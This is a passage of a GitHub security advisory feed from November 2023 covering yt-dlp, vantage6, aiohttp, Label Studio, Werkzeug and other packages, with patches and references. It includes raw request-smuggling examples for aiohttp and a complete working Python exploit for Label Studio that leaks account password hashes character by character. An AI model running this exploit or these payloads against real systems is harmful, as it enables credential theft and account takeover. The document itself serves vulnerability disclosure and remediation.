<p>Where <code>{{ target_site }}</code> is the URL Generic extractor will request and <code>{{ proxy url }}</code> is the proxy to proxy the request for this url through.</p>
</details>

<h3 id="patches">Patches</h3>
<ul>
<li>We have removed the ability to smuggle <code>http_headers</code> to the Generic extractor, as well as other extractors that use the same pattern.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Disable Generic extractor (<code>--ies default,-generic</code>), or only pass trusted sites with trusted content.</li>
<li>Take caution when using <code>--no-check-certificate</code>.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3ch3-jhc6-5r8x">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3ch3-jhc6-5r8x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46121">https://nvd.nist.gov/vuln/detail/CVE-2023-46121</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/releases/tag/2023.11.14">https://github.com/yt-dlp/yt-dlp/releases/tag/2023.11.14</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/commit/f04b5bedad7b281bee9814686bba1762bae092eb">https://github.com/yt-dlp/yt-dlp/commit/f04b5bedad7b281bee9814686bba1762bae092eb</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3ch3-jhc6-5r8x">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3ch3-jhc6-5r8x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46121">https://nvd.nist.gov/vuln/detail/CVE-2023-46121</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/commit/f04b5bedad7b281bee9814686bba1762bae092eb">https://github.com/yt-dlp/yt-dlp/commit/f04b5bedad7b281bee9814686bba1762bae092eb</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/releases/tag/2023.11.14">https://github.com/yt-dlp/yt-dlp/releases/tag/2023.11.14</a></li>
<li><a href="https://github.com/advisories/GHSA-3ch3-jhc6-5r8x">https://github.com/advisories/GHSA-3ch3-jhc6-5r8x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3ch3-jhc6-5r8x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-15T14:48:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vantage6-server] vantage6-server node accepts non-whitelisted algorithms from malicious server]]></title>
        <id>https://github.com/advisories/GHSA-vc3v-ppc7-v486</id>
        <link href="https://github.com/advisories/GHSA-vc3v-ppc7-v486"/>
        <updated>2023-11-14T22:21:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A node does not check if an image is allowed to run if a <code>parent_id</code> is set. A malicious party that breaches the server may modify it to set a fake <code>parent_id</code> and send a task of a non-whitelisted algorithm. The node will then execute it because the <code>parent_id</code> that is set prevents checks from being run. Relevant node code <a href="https://github.com/vantage6/vantage6/blob/version/4.1.1/vantage6-node/vantage6/node/docker/docker_manager.py#L265-L268">here</a></p>
<p>This impacts all servers that are breached by an expert user</p>
<h3 id="patches">Patches</h3>
<p>Fixed in v4.1.2</p>
<h3 id="workarounds">Workarounds</h3>
<p>None</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vantage6/vantage6/security/advisories/GHSA-vc3v-ppc7-v486">https://github.com/vantage6/vantage6/security/advisories/GHSA-vc3v-ppc7-v486</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47631">https://nvd.nist.gov/vuln/detail/CVE-2023-47631</a></li>
<li><a href="https://github.com/vantage6/vantage6/commit/bf83521eb12fa80aa5fc92ef1692010a9a7f8243">https://github.com/vantage6/vantage6/commit/bf83521eb12fa80aa5fc92ef1692010a9a7f8243</a></li>
<li><a href="https://github.com/vantage6/vantage6/blob/version/4.1.1/vantage6-node/vantage6/node/docker/docker_manager.py#L265-L268">https://github.com/vantage6/vantage6/blob/version/4.1.1/vantage6-node/vantage6/node/docker/docker_manager.py#L265-L268</a></li>
<li><a href="https://github.com/advisories/GHSA-vc3v-ppc7-v486">https://github.com/advisories/GHSA-vc3v-ppc7-v486</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc3v-ppc7-v486</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-14T22:21:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aiohttp] AIOHTTP has problems in HTTP parser (the python one, not llhttp)]]></title>
        <id>https://github.com/advisories/GHSA-gfw2-4jvh-wgfg</id>
        <link href="https://github.com/advisories/GHSA-gfw2-4jvh-wgfg"/>
        <updated>2023-11-14T22:21:00.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>The HTTP parser in AIOHTTP has numerous problems with header parsing, which could lead to request smuggling.
This parser is only used when <code>AIOHTTP_NO_EXTENSIONS</code> is enabled (or not using a prebuilt wheel).</p>
<h1 id="details">Details</h1>
<h2 id="bug-1-bad-parsing-of-content-length-values">Bug 1: Bad parsing of <code>Content-Length</code> values</h2>
<h3 id="description">Description</h3>
<p>RFC 9110 says this:</p>
<blockquote>
<p><code>Content-Length = 1*DIGIT</code></p>
</blockquote>
<p>AIOHTTP does not enforce this rule, presumably because of an incorrect usage of the builtin <code>int</code> constructor. Because the <code>int</code> constructor accepts <code>+</code> and <code>-</code> prefixes, and digit-separating underscores, using <code>int</code> to parse CL values leads AIOHTTP to significant misinterpretation.</p>
<h3 id="examples">Examples</h3>
<pre><code>GET / HTTP/1.1\r\n
Content-Length: -0\r\n
\r\n
X
</code></pre>
<pre><code>GET / HTTP/1.1\r\n
Content-Length: +0_1\r\n
\r\n
X
</code></pre>
<h3 id="suggested-action">Suggested action</h3>
<p>Verify that a <code>Content-Length</code> value consists only of ASCII digits before parsing, as the standard requires.</p>
<h2 id="bug-2-improper-handling-of-nul-cr-and-lf-in-header-values">Bug 2: Improper handling of NUL, CR, and LF in header values</h2>
<h3 id="description-1">Description</h3>
<p>RFC 9110 says this:</p>
<blockquote>
<p>Field values containing CR, LF, or NUL characters are invalid and dangerous, due to the varying ways that implementations might parse and interpret those characters; a recipient of CR, LF, or NUL within a field value MUST either reject the message or replace each of those characters with SP before further processing or forwarding of that message.</p>
</blockquote>
<p>AIOHTTP's HTTP parser does not enforce this rule, and will happily process header values containing these three forbidden characters without replacing them with SP.</p>
<h3 id="examples-1">Examples</h3>
<pre><code>GET / HTTP/1.1\r\n
Header: v\x00alue\r\n
\r\n
</code></pre>
<pre><code>GET / HTTP/1.1\r\n
Header: v\ralue\r\n
\r\n
</code></pre>
<pre><code>GET / HTTP/1.1\r\n
Header: v\nalue\r\n
\r\n
</code></pre>
<h3 id="suggested-action-1">Suggested action</h3>
<p>Reject all messages with NUL, CR, or LF in a header value. The translation to space thing, while technically allowed, does not seem like a good idea to me.</p>
<h2 id="bug-3-improper-stripping-of-whitespace-before-colon-in-http-headers">Bug 3: Improper stripping of whitespace before colon in HTTP headers</h2>
<h3 id="description-2">Description</h3>
<p>RFC 9112 says this:</p>
<blockquote>
<p>No whitespace is allowed between the field name and colon. In the past, differences in the handling of such whitespace have led to security vulnerabilities in request routing and response handling. A server MUST reject, with a response status code of 400 (Bad Request), any received request message that contains whitespace between a header field name and colon.</p>
</blockquote>
<p>AIOHTTP does not enforce this rule, and will simply strip any whitespace before the colon in an HTTP header.</p>
<h3 id="example">Example</h3>
<pre><code>GET / HTTP/1.1\r\n
Content-Length : 1\r\n
\r\n
X
</code></pre>
<h3 id="suggested-action-2">Suggested action</h3>
<p>Reject all messages with whitespace before a colon in a header field, as the standard requires.</p>
<h1 id="poc">PoC</h1>
<p>Example requests are embedded in the previous section. To reproduce these bugs, start an AIOHTTP server without llhttp (i.e. <code>AIOHTTP_NO_EXTENSIONS=1</code>) and send the requests given in the previous section. (e.g. by <code>printf</code>ing into <code>nc</code>)</p>
<h1 id="impact">Impact</h1>
<p>Each of these bugs can be used for request smuggling.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-gfw2-4jvh-wgfg">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-gfw2-4jvh-wgfg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47627">https://nvd.nist.gov/vuln/detail/CVE-2023-47627</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/commit/d5c12ba890557a575c313bb3017910d7616fce3d">https://github.com/aio-libs/aiohttp/commit/d5c12ba890557a575c313bb3017910d7616fce3d</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/releases/tag/v3.8.6">https://github.com/aio-libs/aiohttp/releases/tag/v3.8.6</a></li>
<li><a href="https://github.com/advisories/GHSA-gfw2-4jvh-wgfg">https://github.com/advisories/GHSA-gfw2-4jvh-wgfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gfw2-4jvh-wgfg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-14T22:20:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[remarshal] Remarshal expands YAML alias nodes unlimitedly, hence Remarshal is vulnerable to Billion Laughs Attack]]></title>
        <id>https://github.com/advisories/GHSA-gw7g-qr8w-3448</id>
        <link href="https://github.com/advisories/GHSA-gw7g-qr8w-3448"/>
        <updated>2023-11-14T22:19:06.000Z</updated>
        <content type="html"><![CDATA[<p>Remarshal prior to v0.17.1 expands YAML alias nodes unlimitedly, hence Remarshal is vulnerable to Billion Laughs Attack. Processing untrusted YAML files may cause a denial-of-service (DoS) condition.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47163">https://nvd.nist.gov/vuln/detail/CVE-2023-47163</a></li>
<li><a href="https://github.com/remarshal-project/remarshal/commit/fd6ac799a02f533c3fc243b49cdd6d21aa7ee494">https://github.com/remarshal-project/remarshal/commit/fd6ac799a02f533c3fc243b49cdd6d21aa7ee494</a></li>
<li><a href="https://github.com/remarshal-project/remarshal/releases/tag/v0.17.1">https://github.com/remarshal-project/remarshal/releases/tag/v0.17.1</a></li>
<li><a href="https://jvn.jp/en/jp/JVN86156389/">https://jvn.jp/en/jp/JVN86156389/</a></li>
<li><a href="https://github.com/advisories/GHSA-gw7g-qr8w-3448">https://github.com/advisories/GHSA-gw7g-qr8w-3448</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gw7g-qr8w-3448</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-13T03:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aiohttp] Aiohttp has inconsistent interpretation of `Content-Length` vs. `Transfer-Encoding` differing in C and Python fallbacks]]></title>
        <id>https://github.com/advisories/GHSA-xx9p-xxvh-7g8j</id>
        <link href="https://github.com/advisories/GHSA-xx9p-xxvh-7g8j"/>
        <updated>2023-11-14T21:37:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Aiohttp has a security vulnerability regarding the inconsistent interpretation of the http protocol. As we know that HTTP/1.1 is persistent, if we have both Content-Length(CL) and Transfer-Encoding(TE) it can lead to incorrect interpretation of two entities that parse the HTTP and we can poison other sockets with this incorrect interpretation.</p>
<p>A possible Proof-of-Concept (POC) would be a configuration with a reverse proxy(frontend) that accepts both CL and TE headers and aiohttp as backend. As aiohttp parses anything with chunked, we can pass a chunked123 as TE, the frontend entity will ignore this header and will parse Content-Length. I can give a Dockerfile with the configuration if you want.</p>
<p>The impact of this vulnerability is that it is possible to bypass any proxy rule, poisoning sockets to other users like passing Authentication Headers, also if it is present an Open Redirect (just like CVE-2021-21330) we can combine it to redirect random users to our website and log the request.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/commit/f016f0680e4ace6742b03a70cb0382ce86abe371">https://github.com/aio-libs/aiohttp/commit/f016f0680e4ace6742b03a70cb0382ce86abe371</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-xx9p-xxvh-7g8j">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-xx9p-xxvh-7g8j</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/commit/f016f0680e4ace6742b03a70cb0382ce86abe371">https://github.com/aio-libs/aiohttp/commit/f016f0680e4ace6742b03a70cb0382ce86abe371</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/releases/tag/v3.8.0">https://github.com/aio-libs/aiohttp/releases/tag/v3.8.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47641">https://nvd.nist.gov/vuln/detail/CVE-2023-47641</a></li>
<li><a href="https://github.com/advisories/GHSA-xx9p-xxvh-7g8j">https://github.com/advisories/GHSA-xx9p-xxvh-7g8j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xx9p-xxvh-7g8j</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-11-14T20:36:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow vulnerable to Exposure of Sensitive Information to an Unauthorized Actor]]></title>
        <id>https://github.com/advisories/GHSA-r7x6-xfcm-3mxv</id>
        <link href="https://github.com/advisories/GHSA-r7x6-xfcm-3mxv"/>
        <updated>2023-11-14T20:35:48.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow, versions before 2.7.3, has a vulnerability that allows an authorized user who has access to read specific DAGs only, to read information about task instances in other DAGs.&nbsp; This is a different issue than CVE-2023-42663 but leading to similar outcome.
Users of Apache Airflow are advised to upgrade to version 2.7.3 or newer to mitigate the risk associated with this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-42781">https://nvd.nist.gov/vuln/detail/CVE-2023-42781</a></li>
<li><a href="https://github.com/apache/airflow/pull/34939">https://github.com/apache/airflow/pull/34939</a></li>
<li><a href="https://lists.apache.org/thread/7dnl8nszdxqyns57f3dw0sloy5dfl9o1">https://lists.apache.org/thread/7dnl8nszdxqyns57f3dw0sloy5dfl9o1</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/11/12/2">http://www.openwall.com/lists/oss-security/2023/11/12/2</a></li>
<li><a href="https://github.com/apache/airflow/commit/33ec72948f74f56f2adb5e2d388e60e88e8a3fa3">https://github.com/apache/airflow/commit/33ec72948f74f56f2adb5e2d388e60e88e8a3fa3</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-231.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-231.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-r7x6-xfcm-3mxv">https://github.com/advisories/GHSA-r7x6-xfcm-3mxv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r7x6-xfcm-3mxv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-12T15:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[label-studio] Label Studio Object Relational Mapper Leak Vulnerability in Filtering Task]]></title>
        <id>https://github.com/advisories/GHSA-6hjj-gq77-j4qw</id>
        <link href="https://github.com/advisories/GHSA-6hjj-gq77-j4qw"/>
        <updated>2023-11-14T18:27:12.000Z</updated>
        <content type="html"><![CDATA[<h1 id="introduction">Introduction</h1>
<p>This write-up describes a vulnerability found in <a href="https://github.com/HumanSignal/label-studio">Label Studio</a>, a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to <code>1.9.2post0</code> and was tested on version <code>1.8.2</code>.</p>
<h1 id="overview">Overview</h1>
<p>In all current versions of <a href="https://github.com/HumanSignal/label-studio">Label Studio</a>, the application allows users to insecurely set filters for filtering tasks. An attacker can construct a <em>filter chain</em> to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.</p>
<pre><code>filter:tasks:updated_by__active_organization__active_users__password
</code></pre>
<p>For consistency, this type of vulnerability will be termed as <strong>ORM Leak</strong> in the rest of this disclosure. </p>
<p>In addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.</p>
<h1 id="description">Description</h1>
<p>The following code snippet from the <code>ViewSetSerializer</code> in <a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115"><code>label_studio/data_manager/serializers.py</code></a> insecurely creates <code>Filter</code> objects from a JSON <code>POST</code> request to the <code>/api/dm/views/{viewId}</code> API endpoint.</p>
<pre><code class="language-python">    @staticmethod
    def _create_filters(filter_group, filters_data):
        filter_index = 0
        for filter_data in filters_data:
            filter_data["index"] = filter_index
            filter_group.filters.add(Filter.objects.create(**filter_data))
            filter_index += 1
</code></pre>
<p>These <code>Filter</code> objects are then applied in the <code>TaskQuerySet</code> in <a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473"><code>label_studio/data_manager/managers.py</code></a>.</p>
<pre><code class="language-python">class TaskQuerySet(models.QuerySet):
    def prepared(self, prepare_params=None):
        """ Apply filters, ordering and selected items to queryset

        :param prepare_params: prepare params with project, filters, orderings, etc
        :return: ordered and filtered queryset
        """
        from projects.models import Project

        queryset = self

        if prepare_params is None:
            return queryset

        project = Project.objects.get(pk=prepare_params.project)
        request = prepare_params.request
        queryset = apply_filters(queryset, prepare_params.filters, project, request) &lt;1&gt;
        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)

        if not prepare_params.selectedItems:
            return queryset

        # included selected items
        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:
            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)

        # excluded selected items
        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:
            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)

        return queryset
</code></pre>
<ol>
<li>User provided filters are insecurely applied here by calling the <code>apply_filters</code> that constructs the Django ORM filter.</li>
</ol>
<p>The <code>PreparedTaskManager</code> in <a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655"><code>label_studio/data_manager/managers.py</code></a> uses the vulnerable <code>TaskQuerySet</code> for building the Django queryset for querying <code>Task</code> objects, as shown in the following code snippet.</p>
<pre><code class="language-python">class PreparedTaskManager(models.Manager):
    #...

    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): &lt;1&gt;
        """
        :param fields_for_evaluation: list of annotated fields in task
        :param prepare_params: filters, ordering, selected items
        :param all_fields: evaluate all fields for task
        :param request: request for user extraction
        :return: task queryset with annotated fields
        """
        queryset = self.only_filtered(prepare_params=prepare_params)
        return self.annotate_queryset(
            queryset,
            fields_for_evaluation=fields_for_evaluation,
            all_fields=all_fields,
            request=prepare_params.request
        )

    def only_filtered(self, prepare_params=None):
        request = prepare_params.request
        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) &lt;1&gt;
        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)
        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)
        return queryset.prepared(prepare_params=prepare_params)
</code></pre>
<ol>
<li>Special Django method for the <code>models.Manager</code> class that is used to retrieve the queryset for querying objects of a model.</li>
<li>Uses the vulnerable <code>TaskQuerySet</code> that was explained above.</li>
</ol>
<p>The following code snippet of the <code>Task</code> model in <a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102"><code>label_studio/tasks/models.py</code></a> shows that the vulnerable <code>PreparedTaskManager</code> is set as a class variable, along with the <code>updated_by</code> relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.</p>
<pre><code class="language-python"># ...
class Task(TaskMixin, models.Model):
    """ Business tasks from project
    """
    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)

    # ...

    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',
        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),
        help_text='Last annotator or reviewer who updated this task') &lt;1&gt;

    # ...

    objects = TaskManager()  # task manager by default
    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app &lt;2&gt;

    # ...
</code></pre>
<ol>
<li>The entry point of the filter chain to filter by the <code>updated_by__active_organization__active_users__password</code>.</li>
<li>The vulnerable <code>PreparedTaskManager</code> being set that will be exploited.</li>
</ol>
<p>Finally, the <code>TaskListAPI</code> view set in <a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205"><code>label_studio/tasks/api.py</code></a> with the <code>/api/tasks</code> API endpoint uses the vulnerable <code>PreparedTaskManager</code> to filter <code>Task</code> objects.</p>
<pre><code class="language-python">    def get_queryset(self):
        task_id = self.request.parser_context['kwargs'].get('pk')
        task = generics.get_object_or_404(Task, pk=task_id)
        review = bool_from_request(self.request.GET, 'review', False)
        selected = {"all": False, "included": [self.kwargs.get("pk")]}
        if review:
            kwargs = {
                'fields_for_evaluation': ['annotators', 'reviewed']
            }
        else:
            kwargs = {'all_fields': True}
        project = self.request.query_params.get('project') or self.request.data.get('project')
        if not project:
            project = task.project.id
        return self.prefetch(
            Task.prepared.get_queryset(
                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),
                **kwargs
            )) &lt;1&gt;
</code></pre>
<ol>
<li>Uses the vulnerable <code>PreparedTaskManager</code> to filter objects.</li>
</ol>
<h1 id="proof-of-concept">Proof of Concept</h1>
<p>Below are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.</p>
<ol>
<li>Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.</li>
<li>Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.</li>
<li>Navigate to the task view for the project and add any filter with the <code>Network</code> inspect tab open on the browser. Look for a <code>PATCH</code> request to <code>/api/dm/views/{view_id}?interaction=filter&amp;project={project_id}</code> and save the <code>view_id</code> and <code>project_id</code> for the next step.</li>
<li>Download the attached proof of concept exploit script named <code>labelstudio_ormleak.py</code>. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the <code>{view_id}</code>, <code>{project_id}</code>, <code>{cookie_str}</code> and <code>{url}</code> with the corresponding values. For further explanation run <code>python3 labelstudio_ormleak.py --help</code>.</li>
</ol>
<pre><code class="language-bash">python3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'
</code></pre>
<p>The following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash <code>pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=</code>.</p>
<p><img alt="labelstudio_ormleak_poc" src="https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif"></p>
<h1 id="impact">Impact</h1>
<p>This vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions <code>&lt;=1.8.1</code>, this finding can also be chained with hard coded <code>SECRET_KEY</code> to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.</p>
<h1 id="remediation-advice">Remediation Advice</h1>
<ul>
<li>Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.</li>
<li>Validate filter values to an allow list before performing any queries.</li>
</ul>
<h1 id="discovered">Discovered</h1>
<ul>
<li>August 2023, Alex Brown, elttam</li>
</ul>
<hr>
<h1 id="labelstudio_ormleakpy-proof-of-concept"><code>labelstudio_ormleak.py</code> proof of concept</h1>
<pre><code class="language-py">import argparse
import re
import requests
import string
import sys

# Password hash characters
CHARS = string.ascii_letters + string.digits + '$/+=_!'
CHARS_LEN = len(CHARS)

PAYLOAD = {
    "data": {
        "columnsDisplayType": {},
        "columnsWidth": {},
        "filters": {
            "conjunction": "and",
            "items": [
                {
                    "filter": "filter:tasks:updated_by__active_organization__active_users__password", # ORM Leak filter chain
                    "operator": "regex", # Use regex operator to filter password hash value
                    "type": "String",
                    "value": "REPLACEME"
                }
            ]
        },
        "gridWidth": 4,
        "hiddenColumns":{"explore":["tasks:inner_id"],"labeling":["tasks:id","tasks:inner_id"]},
        "ordering": [],
        "search_text": None,
        "target": "tasks",
        "title": "Default",
        "type": "list"
    },
    "id": 1, # View ID
    "project": "1" # Project ID
}

def parse_args() -&gt; argparse.Namespace:
    parser = argparse.ArgumentParser(
        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'
    )

    parser.add_argument(
        '-v', '--view-id',
        help='View id of the page',
        type=int,
        required=True
    )

    parser.add_argument(
        '-p', '--project-id',
        help='Project id to filter tasks for',
        type=int,
        required=True
    )

    parser.add_argument(
        '-c', '--cookie-str',
        help='Cookie string for authentication',
        required=True
    )

    parser.add_argument(
        '-u', '--url',
        help='Base URL to Label Studio instance',
        required=True
    )

    return parser.parse_args()

def setup() -&gt; dict:
    args = parse_args()
    view_id = args.view_id
    project_id = args.project_id
    path_1 = "/api/dm/views/{view_id}?interaction=filter&amp;project={project_id}".format(
        view_id=view_id,
        project_id=project_id
    )
    path_2 = "/api/tasks?page=1&amp;page_size=1&amp;view={view_id}&amp;interaction=filter&amp;project={project_id}".format(
        view_id=view_id,
        project_id=project_id
    )
    PAYLOAD["id"] = view_id
    PAYLOAD["project"] = str(project_id)
    
    config_dict = {
        'COOKIE_STR': args.cookie_str,
        'URL_PATH_1': args.url + path_1,
        'URL_PATH_2': args.url + path_2,
        'PAYLOAD': PAYLOAD
    }
    return config_dict

def test_payload(config_dict: dict, payload) -&gt; bool:
    sys.stdout.flush()
    cookie_str = config_dict["COOKIE_STR"]
    r_set = requests.patch(
        config_dict["URL_PATH_1"],
        json=payload,
        headers={
            "Cookie": cookie_str
        }
    )

    r_listen = requests.get(
        config_dict['URL_PATH_2'],
        headers={
            "Cookie": cookie_str
        }
    )

    r_json = r_listen.json()
    return len(r_json["tasks"]) &gt;= 1

def test_char(config_dict, known_hash, c):
    json_payload_suffix = PAYLOAD
    test_escaped = re.escape(known_hash + c)
    json_payload_suffix["data"]["filters"]["items"][0]["value"] =  f"^{test_escaped}"

    suffix_result = test_payload(config_dict, json_payload_suffix)
    if suffix_result:
        return (known_hash + c, c)
    
    return None

def main():
    config_dict = setup()
    # By default Label Studio password hashes start with these characters
    known_hash = "pbkdf2_sha256$260000$"
    print()
    print(f"dumped: {known_hash}", end="")
    sys.stdout.flush()

    while True:
        found = False

        for c in CHARS:
            r = test_char(config_dict, known_hash, c)
            if not r is None:
                new_hash, c = r
                known_hash = new_hash
                print(c, end="")
                sys.stdout.flush()
                found = True
                break

        if not found:
            break

    print()

if __name__ == "__main__":
    main()
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/HumanSignal/label-studio/security/advisories/GHSA-6hjj-gq77-j4qw">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-6hjj-gq77-j4qw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47117">https://nvd.nist.gov/vuln/detail/CVE-2023-47117</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/commit/f931d9d129002f54a495995774ce7384174cef5c">https://github.com/HumanSignal/label-studio/commit/f931d9d129002f54a495995774ce7384174cef5c</a></li>
<li><a href="https://github.com/advisories/GHSA-6hjj-gq77-j4qw">https://github.com/advisories/GHSA-6hjj-gq77-j4qw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6hjj-gq77-j4qw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-14T18:27:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[werkzeug] Werkzeug DoS: High resource usage when parsing multipart/form-data containing a large part with CR/LF character at the beginning]]></title>
        <id>https://github.com/advisories/GHSA-hrfv-mqp8-q5rw</id>
        <link href="https://github.com/advisories/GHSA-hrfv-mqp8-q5rw"/>
        <updated>2023-11-13T21:05:55.000Z</updated>
        <content type="html"><![CDATA[<p>Werkzeug multipart data parser needs to find a boundary that may be between consecutive chunks. That's why parsing is based on looking for newline characters. Unfortunately, code looking for partial boundary in the buffer is written inefficiently, so if we upload a file that starts with CR or LF and then is followed by megabytes of data without these characters: all of these bytes are appended chunk by chunk into internal bytearray and lookup for boundary is performed on growing buffer.</p>
<p>This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process. If many concurrent requests are sent continuously, this can exhaust or kill all available workers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pallets/werkzeug/security/advisories/GHSA-hrfv-mqp8-q5rw">https://github.com/pallets/werkzeug/security/advisories/GHSA-hrfv-mqp8-q5rw</a></li>
